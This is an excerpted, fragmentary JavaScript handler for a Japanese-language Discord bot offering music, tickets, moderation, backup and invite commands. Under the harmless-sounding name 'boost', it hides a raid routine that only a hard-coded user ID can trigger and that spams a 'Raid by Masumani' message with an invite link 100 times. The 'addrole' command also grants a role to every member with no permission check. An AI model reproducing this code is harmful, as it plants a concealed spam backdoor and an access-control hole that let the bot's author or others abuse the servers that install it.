...
async function registerSlashCommands(client) {
  const commands = [
    ...
    new SlashCommandBuilder()
      .setName('level')
      .setDescription('ユーザーのレベルと経験値を管理')
      .addSubcommand(sub => 
        sub.setName('check')
      ...
      .addSubcommand(sub =>
        sub.setName('set')
          ...
          .addIntegerOption(o => o.setName('level').setDescription('設定レベル').setRequired(true)))
  ...
  client.on('interactionCreate', async (interaction) => {
    try {
      if (interaction.isChatInputCommand()) {
        ...
        // チケット
        if (name === 'ticket') return ticketSystem.execute(interaction, STAFF_ROLE_IDS, TICKET_LOG_CHANNEL_ID);
          ...
          if (!aiCooldownExemptIds.includes(interaction.user.id)) {
            ...
            if (now - last < cooldownTime) {
              return interaction.reply({ 
                content: `AIはクールタイム中。あと${Math.ceil((cooldownTime - (now - last)) / 1000)}秒`, 
                ephemeral: true 
              });
            }
        ...
        if (name === '天気') {
          ...
          if (place) {
            ...
            return interaction.editReply(`✅ 天気保存: ${place}`);
          }
        ...
        // 音楽
        if (name === 'join') {
          if (!interaction.member?.voice?.channel) return interaction.reply({ content: '⚠️ VCに参加後実行', ephemeral: true });
          await interaction.deferReply();
          const ok = await joinVoice(interaction.guild, interaction.member.voice.channel);
          return interaction.editReply(ok ? '🔊 参加' : '⚠️ 失敗');
        }
        if (name === 'play') {
          await interaction.deferReply();
          ...
          if (!ok) return interaction.editReply('⚠️ 参加失敗');
          const added = await playUrl(interaction.guild.id, query, interaction.channel);
          return interaction.editReply(added ? `▶️ キュー追加: ${added}` : '⚠️ 取得失敗');
        }
        if (name === 'stop') {
          await interaction.deferReply();
          const vc = getVoiceConnection(interaction.guild.id);
          if (!vc) return interaction.editReply('⚠️ 接続なし');
          const player = vc.state.subscription?.player;
          if (player) {
            player.stop();
            vc.destroy();
            return interaction.editReply('✅ 停止 & 切断');
          } else return interaction.editReply('⚠️ 再生なし');
        }
        if (name === 'leave') {
          await interaction.deferReply();
          await leaveVoice(interaction.guild.id);
          return interaction.editReply('👋 退出');
        }

        // サーバー操作
        if (name === 'backup') {
          await interaction.deferReply();
          if (!hasManageGuildPermission(interaction.member)) return interaction.editReply('⚠️ 権限なし');
        ...
        if (name === 'restore') {
          ...
          return interaction.editReply(ok ? '✅ 復元' : '⚠️ 失敗');
        }
        if (name === 'nuke') {
          await interaction.deferReply();
          if (!hasManageGuildPermission(interaction.member)) return interaction.editReply('⚠️ 権限なし');
          await nukeChannel(interaction.channel);
          return interaction.editReply('💥 再作成完了');
        }
        if (name === 'clear') {
          await interaction.deferReply();
          if (!hasManageGuildPermission(interaction.member)) return interaction.editReply('⚠️ 権限なし');
          const amt = interaction.options.getInteger('amount', true);
          await clearMessages(interaction.channel, amt);
          return interaction.editReply(`🧹 ${amt}件削除`);
        }
        if (name === 'addrole') {
          const role = interaction.options.getString('role_name', true);
          await interaction.deferReply();
          const res = await addRoleToAll(interaction.guild, role);
          return interaction.editReply(res.success ? `🎉 全${res.count}ユーザーに付与` : `❌ 失敗: ${res.error}`);
        }
        if (name === 'boost') {
          const allowed = "1366740571707801610";
          const msg = "## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP";
          const repeat = 100;
          if (interaction.user.id !== allowed) return interaction.reply({ content: "❌ 管理者のみ", ephemeral: true });
          await interaction.reply({ content: `✅ ${repeat}回送信`, ephemeral: true });
          for (let i = 0; i < repeat; i++) await interaction.channel.send(msg);
        }
        if (name === 'lock') {
          await interaction.deferReply();
          const target = interaction.options.getRole('role');
          if (!hasManageGuildPermission(interaction.member)) return interaction.editReply('❌ 権限なし');
          const res = await lockChannels(interaction.guild, target.id);
          return interaction.editReply(`✅ 権限変更完了\n非表示:${res.locked}件\n表示維持:${res.unlocked}件`);
        }
        if (name === 'unlock') {
          await interaction.deferReply();
          if (!hasManageGuildPermission(interaction.member)) return interaction.editReply('❌ 権限なし');
          ...
          try {
            let unlocked = 0;
            for (const [cid, ch] of interaction.guild.channels.cache) {
            ...
            return interaction.editReply(`✅ 全チャンネルリセット: ${unlocked}件`);
          } catch (e) {
            console.error(e);
        ...
        if (name === 'invite') {
          ...
          if (sub === 'create') {
            try {
              ...
              return interaction.editReply(`❌ 失敗: ${e.message}`);
            }
          }
          if (sub === 'count') {
            try {
              const c = await fetchInviteCount(interaction.member);
              return interaction.editReply(`📊 招待人数: ${c}`);
            } catch {
              return interaction.editReply('❌ 取得失敗');
            }
          }
        }
      ...
      if (interaction.isButton()) {
        ...
        if (cmd === 'ticket') return ticketSystem.buttonHandler(interaction, STAFF_ROLE_IDS, TICKET_LOG_CHANNEL_ID);
